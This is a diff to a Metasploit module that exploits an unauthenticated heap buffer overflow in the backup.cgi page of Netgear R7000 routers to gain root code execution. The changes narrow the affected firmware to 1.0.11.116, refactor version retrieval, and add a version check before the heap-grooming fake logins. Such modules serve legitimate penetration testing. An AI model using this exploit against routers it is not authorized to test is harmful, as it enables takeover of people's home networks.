@@ -13,8 +13,8 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Netgear R7000 backup.cgi Heap Overflow RCE',
         'Description' => %q{
-          This module exploits an heap buffer overflow in the genie.cgi?backup.cgi
-          page of Netgear R7000 routers running firmware versions 1.0.11.116 and prior.
+          This module exploits a heap buffer overflow in the genie.cgi?backup.cgi
+          page of Netgear R7000 routers running firmware version 1.0.11.116.
           Successful exploitation results in unauthenticated attackers gaining
           code execution as the root user.
 
@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
         'Privileged' => true,
         'Arch' => ARCH_ARMLE,
         'Targets' => [
-          [ 'Netgear R7000', {} ]
+          [ 'Netgear R7000 Firmware Version 1.0.11.116', {} ]
         ],
         'Notes' =>
           {
@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     text[/#{start_trig}(.*?)#{end_trig}/m, 1]
   end
 
-  def check_vuln_firmware
+  def retrieve_firmware_version
     res = send_request_cgi({ 'uri' => '/currentsetting.htm' })
     if res.nil?
       return Exploit::CheckCode::Unknown('Connection timed out.')
@@ -76,6 +76,11 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')
     end
 
+    firmware_version
+  end
+
+  def check_vuln_firmware
+    firmware_version = retrieve_firmware_version
     firmware_version = Rex::Version.new(firmware_version[1])
     if firmware_version <= Rex::Version.new('1.0.11.116') || firmware_version == Rex::Version.new('1.0.11.208') || firmware_version == Rex::Version.new('1.0.11.204')
       return true
@@ -326,6 +331,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    firmware_version = retrieve_firmware_version
+
+    firmware_version = Rex::Version.new(firmware_version[1])
+    if firmware_version != Rex::Version.new('1.0.11.116')
+      print_error('Sorry but at this point in time only version 1.0.11.116 of the R7000 firmware is exploitable with this module!')
+      return
+    end
+
     unless fake_logins_to_ease_heap # Set the heap to a more predictable state via a series of fake logins.
       fail_with(Failure::UnexpectedReply, 'The target R7000 router did not send us the expected 200 OK response after 3 invalid login attempts!')
     end
